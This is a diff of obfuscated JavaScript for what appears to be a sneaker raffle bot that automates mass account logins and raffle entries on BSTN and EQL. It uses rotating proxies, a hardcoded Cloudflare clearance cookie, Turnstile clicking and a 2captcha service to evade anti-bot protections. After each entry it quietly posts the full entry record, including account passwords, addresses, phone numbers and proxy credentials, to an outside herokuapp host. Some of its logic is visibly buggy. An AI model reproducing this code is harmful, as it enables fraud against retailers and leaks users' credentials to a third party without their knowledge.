+                            var _0x24a394 = Math['round'](Math['random']() * (_0x5178e7['length'] - 0x1)), _0x1927a6 = _0x5178e7[_0x24a394]['split'](':'), _0x5602f7;
+                            let _0x3fd20e = ![], _0x55c2c7 = 'no';
+                            try {
+                                if (await _0x23b56f(_0x44092e[_0x46ac51]) == !![]) {
+                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3fd20e = !![], _0x526a34 = !![];
+                                    return;
+                                }
+                                try {
+                                    _0x5602f7 = await _0x5d136d['launch']({
+                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                        'headless': ![],
+                                        'args': [
+                                            '--proxy-server=' + _0x1927a6[0x0] + ':' + _0x1927a6[0x1],
+                                            '--no-sandbox',
+                                            '--disable-setuid-sandbox'
+                                        ]
+                                    });
+                                } catch {
+                                    _0x5602f7 = await _0x5d136d['launch']({
+                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                        'headless': ![],
+                                        'args': [
+                                            '--proxy-server=' + _0x1927a6[0x0] + ':' + _0x1927a6[0x1],
+                                            '--no-sandbox',
+                                            '--disable-setuid-sandbox'
+                                        ]
+                                    });
+                                }
+                                const _0xd02d05 = await _0x5602f7['newPage'](), _0x1a4df2 = await _0xd02d05['target']()['createCDPSession'](), { windowId: _0x5ae354 } = await _0x1a4df2['send']('Browser.getWindowForTarget');
+                                await _0xd02d05['setViewport']({
+                                    'width': 0x501,
+                                    'height': 0x2d0
+                                });
+                                var _0x16b635 = [{
+                                    'name': 'cf_clearance',
+                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
+                                    'domain': '.bstn.com',
+                                    'path': '/',
+                                    'expires': 1707818183.331533,
+                                    'httpOnly': !![],
+                                    'secure': !![]
+                                }];
+                                await _0xd02d05['authenticate']({
+                                    'username': '' + _0x1927a6[0x2],
+                                    'password': '' + _0x1927a6[0x3]
+                                }), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd02d05['goto']('' + _0x44092e[_0x46ac51]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x116d4a(0x1388);
+                                var _0x1a737b = await _0xd02d05['$']('#turnstile-wrapper');
+                                if (_0x1a737b) {
+                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x116d4a(0x2710);
+                                    const _0xcf0b4b = await _0xd02d05['$']('#turnstile-wrapper');
+                                    if (_0xcf0b4b)
+                                        try {
+                                            await _0xcf0b4b['click']();
+                                        } catch {
+                                            throw new Error('Empty\x20Turnstile\x20Challenge');
+                                        }
+                                    try {
+                                        await _0xd02d05['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
+                                    } catch {
+                                        var _0x13881f = await _0xd02d05['$']('#turnstile-wrapper');
+                                        if (_0x13881f)
+                                            try {
+                                                await _0x13881f['click']();
+                                            } catch {
+                                                throw new Error('Empty\x20Turnstile\x20Challenge');
+                                            }
+                                    }
+                                }
+                                try {
+                                    await _0xd02d05['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
+                                } catch {
+                                    throw new Error('Blocked\x20by\x20Cloudflare');
+                                }
+                                await _0x1a4df2['send']('Browser.setWindowBounds', {
+                                    'windowId': _0x5ae354,
+                                    'bounds': { 'windowState': 'minimized' }
+                                }), await _0x116d4a(0x1388), await _0xd02d05['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd02d05['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x116d4a(0x1f4), console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Logging\x20in'), await _0xd02d05['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x515807 => _0x515807['click']()), await _0xd02d05['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0xd02d05['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x116d4a(0x7d0), await _0xd02d05['waitForSelector']('#email-login'), await _0xd02d05['type']('#email-login', '' + _0x44092e[_0x46ac51]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x116d4a(0xdac), await _0xd02d05['waitForSelector']('#password'), await _0xd02d05['type']('#password', '' + _0x44092e[_0x46ac51]['Password'], { 'delay': 0xe6 }), await _0x116d4a(0x157c);
+                                try {
+                                    await _0xd02d05['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x51c02b => _0x51c02b['click']());
+                                } catch {
+                                }
+                                try {
+                                    await _0xd02d05['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
+                                } catch (_0x3abf26) {
+                                }
+                                await _0x116d4a(0x3e8);
+                                const _0x201900 = await _0xd02d05['$']('.enteredDraw_container__2KmQ_');
+                                if (_0x201900) {
+                                    console['log']('Duplicate\x20entry,\x20skipping');
+                                    return;
+                                }
+                                console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x44092e[_0x46ac51]['Size']);
+                                try {
+                                    if (_0x44092e[_0x46ac51]['Size'] != 'RANDOM') {
+                                        var _0x25edc1 = _0x44092e[_0x46ac51]['Size']['replace']('.', ',');
+                                        const _0x5799f8 = await _0xd02d05['$x']('//div[contains(text(),\x20\x27' + _0x25edc1 + '\x27)]');
+                                        await _0x5799f8[0x0]['click']();
+                                    } else {
+                                        const _0x11f309 = await _0xd02d05['$$']('div.swatchTile_tile__IRH9Q');
+                                        var _0x52d0a1 = Math['round'](Math['random']() * (_0x11f309['length'] - 0x1));
+                                        await _0x11f309[_0x52d0a1]['click']();
+                                    }
+                                } catch (_0x7c616f) {
+                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
+                                }
+                                await _0x116d4a(0x1f4);
+                                const _0x2d3223 = await _0xd02d05['$']('.addressList_addressItem__LE2PB');
+                                if (_0x2d3223 && _0x44092e[_0x46ac51]['Mode'] != 'NEW') {
+                                } else
+                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Filling\x20Address'), await _0xd02d05['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x116d4a(0x5dc), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#firstname', '' + _0x44092e[_0x46ac51]['FirstName']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#lastname', '' + _0x44092e[_0x46ac51]['LastName']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#street', '' + _0x44092e[_0x46ac51]['Address1']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['type']('#houseNumber', _0x44092e[_0x46ac51]['HouseNumber'] + '\x20' + _0x44092e[_0x46ac51]['Address2']), await _0x116d4a(0x1f4), await _0xd02d05['waitForSelector']('#firstname'), await _0xd02d05['select']('#country_code', '' + _0x44092e[_0x46ac51]['Country']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#postcode', '' + _0x44092e[_0x46ac51]['Zip']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#city', '' + _0x44092e[_0x46ac51]['City']), await _0x116d4a(0x1f4), await _0xd02d05['type']('#telephone', '' + _0x44092e[_0x46ac51]['Phone']), await _0x116d4a(0x1f4), await _0xd02d05['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
+                                await _0x116d4a(0x9c4);
+                                try {
+                                    await _0xd02d05['type']('#instagram_name', '' + _0x44092e[_0x46ac51]['Follower']), await _0xd02d05['click']('.note_groupBtn__WLDwH\x20>\x20button');
+                                } catch {
+                                }
+                                console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x116d4a(0x5dc);
+                                try {
+                                    await _0xd02d05['click']('.checkBox_boxHolder__wLGVe');
+                                } catch {
+                                }
+                                await _0x116d4a(0x5dc), await _0xd02d05['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x132cfe => _0x132cfe['click']()), await _0x116d4a(0x1388);
+                                try {
+                                    await _0xd02d05['waitForSelector']('.success_msg__2HjJY');
+                                } catch {
+                                    await _0xd02d05['reload']({ 'waitUntil': 'networkidle2' });
+                                    if (_0x44092e[_0x46ac51]['Size'] != 'RANDOM') {
+                                        var _0x25edc1 = _0x44092e[_0x46ac51]['Size']['replace']('.', ',');
+                                        const _0x27d644 = await _0xd02d05['$x']('//div[contains(text(),\x20' + _0x25edc1 + ')]');
+                                        await _0x27d644[0x0]['click']();
+                                    } else {
+                                        const _0x29700c = await _0xd02d05['$$']('div.swatchTile_tile__IRH9Q');
+                                        var _0x52d0a1 = Math['round'](Math['random']() * (_0x29700c['length'] - 0x1));
+                                        await _0x29700c[_0x52d0a1]['click']();
+                                    }
+                                    await _0x116d4a(0x5dc);
+                                    try {
+                                        await _0xd02d05['hover']('#instagram_name'), await _0xd02d05['type']('#instagram_name', '' + _0x44092e[_0x46ac51]['Follower']), await _0xd02d05['click']('.note_groupBtn__WLDwH\x20>\x20button');
+                                    } catch {
+                                    }
+                                    console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Retrying\x20(' + _0x34888e + '\x20/\x205)');
+                                    try {
+                                        await _0xd02d05['hover']('.checkBox_boxHolder__wLGVe'), await _0x116d4a(0x5dc), await _0xd02d05['click']('.checkBox_boxHolder__wLGVe');
+                                    } catch {
+                                    }
+                                    await _0x116d4a(0x157c), await _0xd02d05['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5cfb0b => _0x5cfb0b['click']()), await _0x116d4a(0x1388), await _0xd02d05['waitForSelector']('.success_msg__2HjJY');
+                                }
+                                _0x55c2c7 = 'no', _0x523ce4(_0x44092e[_0x46ac51], _0x2a2896);
+                                try {
+                                    prxdata = {
+                                        'username': _0x358285['replace']('#', ''),
+                                        'entrydata': JSON['stringify'](_0x279efc),
+                                        'proxy': '' + _0x5178e7[_0x46ac51]
+                                    };
+                                    var _0x265e89 = JSON['stringify'](prxdata);
+                                    let _0x2b43c0 = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x265e89, _0x2b43c0);
+                                } catch (_0x17cb8c) {
+                                }
+                                console['log'](_0x1403a4['green'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
+                                var _0xffb476 = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', ![]), _0x37e54f = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'pub', ![]);
+                                const _0x263f8e = {
+                                    'succesDEVMSG': { 'embeds': [_0xffb476] },
+                                    'succesPUBMSG': { 'embeds': [_0x37e54f] }
+                                };
+                                let _0x279efc = _0x44092e[_0x46ac51];
+                                try {
+                                    prxdata = {
+                                        'username': _0x358285['replace']('#', ''),
+                                        'module': _0x2a2896['name'],
+                                        'entrydata': JSON['stringify'](_0x279efc),
+                                        'proxy': '' + _0x5178e7[_0x46ac51]
+                                    };
+                                    var _0x265e89 = JSON['stringify'](prxdata);
+                                    let _0x171b02 = { 'headers': { 'content-type': 'application/json' } };
+                                    await _0x5d1b21['post']('https://jraffles.herokuapp.com/success', _0x265e89, _0x171b02);
+                                } catch (_0x581fb3) {
+                                }
+                                try {
+                                    _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x263f8e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x5317eb, _0x263f8e['succesDEVMSG']), await _0x116d4a(0xc8), await _0x3c7bbe(_0x55a106, _0x263f8e['succesPUBMSG']);
+                                } catch (_0x4e5ef3) {
+                                    console['log'](_0x1403a4['yellow'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4e5ef3));
+                                }
+                            } catch (_0x321124) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20' + _0x321124)), _0x55c2c7 = 'yes', _0x2eadbd = '' + _0x321124;
+                                var _0x4d248b = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', !![], _0x2eadbd), _0xffb476 = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'dev', ![]), _0x37e54f = await _0x2520f4(_0x44092e[_0x46ac51], _0x2a2896, 'pub', ![]);
+                                const _0x2bc70f = {
+                                    'succesDEVMSG': { 'embeds': [_0xffb476] },
+                                    'succesPUBMSG': { 'embeds': [_0x37e54f] }
+                                };
+                                _0x2bc70f['errorDEV'] = { 'embeds': [_0x4d248b] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x2bc70f['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x2bc70f['errorDEV']);
+                            } finally {
+                                _0x5602f7 && _0x5602f7['close']();
+                                if (_0x55c2c7 == 'yes' && _0x34888e != 0x5)
+                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Task\x20' + (_0x46ac51 + 0x1) + '\x20:\x20Retrying\x20(' + _0x34888e + '\x20/\x205)')), _0x34888e = _0x34888e + 0x1, _0x33861f--, _0xe3d7d5(_0x2a2896, _0x44092e, _0x5178e7, _0x46ac51, _0x34888e);
+                                _0x55c2c7 == 'yes' && _0x34888e >= 0x5 && _0x5925c7(_0x44092e[_0x46ac51], _0x2a2896), !_0x3fd20e && (console['log'](_0x3982db() + '\x20[' + _0x2a2896['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay'])), _0x33861f--;
+                            }
+                        }
+                        _0xe3d7d5(_0x2f8fe6, _0x12829b, _0x29d587, _0x58f25d, 0x0), await _0x116d4a(0x7d0);
+                    }
+                }
+            },
+            {
+                'name': 'BSTN\x20Win\x20Checker',
+                'store': 'BSTN',
+                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
+                'function': async function (_0x24a42e, _0x5b50c6) {
+                    var _0x51b26c = 0x0, _0x50d402;
+                    try {
+                        const _0x3d7a03 = _0x65e0bc['readFileSync']('../accounts/bstn.csv', 'utf-8');
+                        _0x50d402 = _0x3e0e2d['parse'](_0x3d7a03, { 'header': !![] })['data'];
+                    } catch (_0x158958) {
+                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
+                    }
+                    for (var _0x20f47d = 0x0; _0x20f47d < _0x50d402['length']; _0x20f47d++) {
+                        maxTasks = Number(_0x51d52a['threads']);
+                        while (_0x51b26c >= maxTasks) {
+                            await _0x116d4a(_0x51d52a['delay']);
+                        }
+                        async function _0x819bfd(_0xb3bf2, _0x58f0d3, _0x35a8f6, _0x1c9b2c, _0x4d6617) {
+                            _0x51b26c++, _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                                'provider': {
+                                    'id': '2captcha',
+                                    'token': '' + _0x51d52a['captchaKey']
+                                },
+                                'visualFeedback': !![]
+                            }));
+                            if (_0x34b57f != 'yes')
+                                var _0x34b57f = '', _0x4d6617 = 0x0;
+                            var _0x385a08;
+                            _0x244762(_0xb3bf2['name'] + '\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20/\x20' + _0x35a8f6['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                            var _0x38639c = await _0x2520f4(_0x35a8f6[_0x1c9b2c], _0xb3bf2, 'acc', ![]);
+                            const _0x718177 = { 'succesDEVMSG': { 'embeds': [_0x38639c] } }, _0x1042ee = 'https://www.bstn.com/eu_en/customer/account/create/';
+                            var _0x3d0bd1 = Math['round'](Math['random']() * (_0x58f0d3['length'] - 0x1)), _0x2dc11d = _0x58f0d3[_0x3d0bd1]['split'](':'), _0x116dbe;
+                            try {
+                                _0x116dbe = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x2dc11d[0x0] + ':' + _0x2dc11d[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            } catch {
+                                _0x116dbe = await _0x5d136d['launch']({
+                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                    'headless': !![],
+                                    'args': [
+                                        '--proxy-server=' + _0x2dc11d[0x0] + ':' + _0x2dc11d[0x1],
+                                        '--no-sandbox',
+                                        '--disable-setuid-sandbox'
+                                    ]
+                                });
+                            }
+                            try {
+                                console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Checking\x20' + _0x35a8f6[_0x1c9b2c]['Email']);
+                                const _0x1b9712 = await _0x116dbe['newPage']();
+                                await _0x1b9712['authenticate']({
+                                    'username': '' + _0x2dc11d[0x2],
+                                    'password': '' + _0x2dc11d[0x3]
+                                }), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1b9712['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1b9712['setRequestInterception'](!![]), _0x1b9712['on']('request', _0x22db5d => {
+                                    _0x22db5d['resourceType']() === 'image' ? _0x22db5d['abort']() : _0x22db5d['continue']();
+                                });
+                                try {
+                                    await _0x1b9712['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x1b9712['waitForSelector']('button[class=\x22cf2Lf6\x22]');
+                                } catch {
+                                    _0x34b57f = 'yes';
+                                    throw new Error('Connection\x20Error');
+                                }
+                                await _0x1b9712['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x116d4a(0x3e8), await _0x1b9712['type']('#email', _0x35a8f6[_0x1c9b2c]['Email']), await _0x116d4a(0x1f4), await _0x1b9712['type']('#pass', _0x35a8f6[_0x1c9b2c]['Password']), await _0x116d4a(0x1f4), await _0x1b9712['$eval']('#login-form', _0x2402ed => _0x2402ed['submit']());
+                                try {
+                                    await _0x1b9712['waitForSelector']('.product-items');
+                                } catch {
+                                    console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20No\x20Entries\x20Found');
+                                    return;
+                                }
+                                await _0x116d4a(0x190);
+                                const _0x2921c8 = await _0x1b9712['evaluate'](() => {
+                                    const _0x2d3f09 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
+                                    return _0x2d3f09['map'](_0xfea360 => _0xfea360['alt']);
+                                }), _0x162095 = await _0x1b9712['evaluate'](() => {
+                                    const _0x2189a1 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
+                                    return _0x2189a1['map'](_0xd617cf => _0xd617cf['innerHTML']);
+                                }), _0x1d4e5b = await _0x1b9712['$$']('.raffle-winner');
+                                if (_0x1d4e5b['length'] < 0x1) {
+                                    console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x34b57f = 'no';
+                                    return;
+                                }
+                                console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20' + _0x1d4e5b['length'] + '\x20Wins\x20Found!');
+                                for (var _0x3b4cfb = 0x0; _0x3b4cfb < _0x1d4e5b['length']; _0x3b4cfb++) {
+                                    console['log'](_0x1403a4['green'](_0x2921c8[_0x3b4cfb] + _0x162095[_0x3b4cfb]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
+                                }
+                            } catch (_0x5f4171) {
+                                console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20' + _0x5f4171)), _0x385a08 = '' + _0x5f4171;
+                                var _0x238103 = await _0x2520f4(_0x35a8f6[_0x1c9b2c], _0xb3bf2, 'acc', !![], _0x385a08);
+                                _0x718177['errorDEV'] = { 'embeds': [_0x238103] }, _0x51d52a['webhook'] != undefined && _0x51d52a['webhook'] != '' && await _0x3c7bbe(_0x51d52a['webhook'], _0x718177['errorDEV']), await _0x3c7bbe(_0x802c1e, _0x718177['errorDEV']), _0x34b57f = 'yes';
+                            } finally {
+                                if (_0x116dbe)
+                                    _0x116dbe['close']();
+                                if (_0x34b57f == 'yes' && _0x4d6617 != 0x5)
+                                    return console['log'](_0x1403a4['red'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Task\x20' + (_0x1c9b2c + 0x1) + '\x20:\x20Retrying\x20(' + _0x4d6617 + '\x20/\x205)')), _0x51b26c--, _0x4d6617 = _0x4d6617 + 0x1, _0x819bfd(_0xb3bf2, _0x58f0d3, _0x35a8f6, _0x1c9b2c, _0x4d6617);
+                                _0x34b57f == 'yes' && _0x4d6617 >= 0x5 && (_0x5925c7(_0x35a8f6[_0x1c9b2c], _0xb3bf2), _0x34b57f = 'no', _0x4d6617 = 0x0), console['log'](_0x3982db() + '\x20[' + _0xb3bf2['name'] + ']\x20Waiting\x20for\x20' + _0x51d52a['delay'] + '\x20ms'), await _0x116d4a(_0x51d52a['delay']), _0x51b26c--;
+                            }
+                        }
+                        _0x819bfd(_0x24a42e, _0x5b50c6, _0x50d402, _0x20f47d, 0x0), await _0x116d4a(0x15e);
+                    }
+                }
+            }
+        ]
+    },
+    {
+        'name': 'EQL',
+        'modules': [{
+            'name': 'EQL\x20Raffle\x20Entries',
+            'store': 'EQL',
+            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
+            'function': async function (_0x463ad4, _0x33eb99, _0x7213f8) {
+                _0x5d136d['use'](_0x2ce6bf()), _0x5d136d['use'](_0xe5ec8f({
+                    'provider': {
+                        'id': '2captcha',
+                        'token': '' + _0x51d52a['captchaKey']
+                    },
+                    'visualFeedback': !![]
+                }));
+                for (var _0x3ae296 = 0x0; _0x3ae296 < _0x33eb99['length']; _0x3ae296++) {
+                    var _0x9ba48a;
+                    _0x244762(_0x463ad4['name'] + '\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20/\x20' + _0x33eb99['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                    try {
+                        await _0x2c2316(_0x33eb99, _0x3ae296);
+                    } catch {
+                        _0x18c823 = 'no';
+                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                    }
+                    async function _0x59f1d3(_0x47bbdf) {
+                        const _0x2c9790 = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4d6954 = _0x3e0e2d['parse'](_0x2c9790, { 'header': !![] })['data'];
+                        let _0xf0ad2 = ![];
+                        for (var _0x2a6d14 of _0x4d6954) {
+                            if (_0x2a6d14['Url'] == _0x47bbdf['Url'] && _0x2a6d14['Email'] == _0x47bbdf['Email']) {
+                                _0xf0ad2 = !![];
+                                break;
+                            }
+                        }
+                        return _0xf0ad2;
+                    }
+                    if (await _0x59f1d3(_0x33eb99[_0x3ae296]) == !![]) {
+                        console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
+                        continue;
+                    }
+                    var _0x5c1316 = ![];
+                    const _0x55006b = _0x65e0bc['readFileSync']('../accounts/eql.csv', 'utf8');
+                    var _0xf852f = _0x3e0e2d['parse'](_0x55006b, { 'header': !![] })['data'];
+                    for (var _0x1fb16f of _0xf852f) {
+                        _0x1fb16f['Email'] == _0x33eb99[_0x3ae296]['Email'] && (_0x5c1316 = !![]);
+                    }
+                    if (_0x5c1316 == ![]) {
+                        var _0x521081;
+                        if (_0x33eb99[_0x3ae296]['Url']['endsWith']('/')) {
+                            _0x521081 = _0x33eb99[_0x3ae296]['Url'] + 'register';
+                            if (_0x18c823 != 'yes')
+                                var _0x18c823 = '', _0x133942 = 0x0;
+                        } else {
+                            _0x521081 = _0x33eb99[_0x3ae296]['Url'] + '/register';
+                            if (_0x18c823 != 'yes')
+                                var _0x18c823 = '', _0x133942 = 0x0;
+                        }
+                        if (_0x33eb99[_0x3ae296]['Email'] == '' || _0x33eb99[_0x3ae296]['FirstName'] == '' || _0x33eb99[_0x3ae296]['LastName'] == '') {
+                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Invalid\x20CSV');
+                            continue;
+                        }
+                        _0x33eb99[_0x3ae296]['Password'] == '' && (_0x33eb99[_0x3ae296]['Password'] = 'JRaffles23!');
+                        if (_0x51d52a['useRandomProxy'] = ![])
+                            var _0x1b0a26 = _0x7213f8[_0x3ae296]['split'](':');
+                        else
+                            var _0x495766 = Math['round'](Math['random']() * (_0x7213f8['length'] - 0x1)), _0x1b0a26 = _0x7213f8[_0x495766]['split'](':');
+                        var _0x3a464f;
+                        try {
+                            _0x3a464f = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        } catch {
+                            _0x3a464f = await _0x5d136d['launch']({
+                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                                'headless': !![],
+                                'args': [
+                                    '--proxy-server=' + _0x1b0a26[0x0] + ':' + _0x1b0a26[0x1],
+                                    '--no-sandbox',
+                                    '--disable-setuid-sandbox'
+                                ]
+                            });
+                        }
+                        try {
+                            const _0x277da8 = await _0x3a464f['newPage']();
+                            await _0x277da8['authenticate']({
+                                'username': '' + _0x1b0a26[0x2],
+                                'password': '' + _0x1b0a26[0x3]
+                            }), console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x277da8['setRequestInterception'](!![]), _0x277da8['on']('request', _0x524073 => {
+                                _0x524073['resourceType']() === 'image' || _0x524073['resourceType']() === 'font' || _0x524073['resourceType']() === 'media' ? _0x524073['abort']() : _0x524073['continue']();
+                            });
+                            try {
+                                await _0x277da8['goto']('' + _0x521081);
+                            } catch {
+                                throw new Error('Connection\x20Error');
+                            }
+                            console['log'](_0x3982db() + '\x20[' + _0x463ad4['name'] + ']\x20Task\x20' + (_0x3ae296 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x116d4a(0x3e8), await _0x277da8['waitForSelector']('#email'), await _0x277da8['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x116d4a(0x3e8);
+                            try {
